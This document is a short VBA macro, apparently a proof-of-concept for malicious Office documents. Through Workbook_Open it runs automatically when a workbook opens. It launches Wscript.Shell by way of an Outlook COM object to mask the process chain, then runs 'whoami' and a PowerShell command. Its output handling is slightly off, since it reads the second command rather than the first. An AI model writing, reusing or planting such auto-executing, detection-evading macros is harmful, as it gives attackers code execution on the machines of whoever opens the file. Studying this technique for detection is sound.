
```
Sub Workbook_Open()

	Set objOL = CreateObject("Outlook.Application")

	Set WshShell = objOL.CreateObject("Wscript.Shell")

	Set WshShellExec = WshShell.Exec("whoami")

	Set WshShellExec = WshShell.Exec("powershell -c sleep 5000")

	MsgBox (WshShellExec.StdOut.ReadAll)

End Sub
```
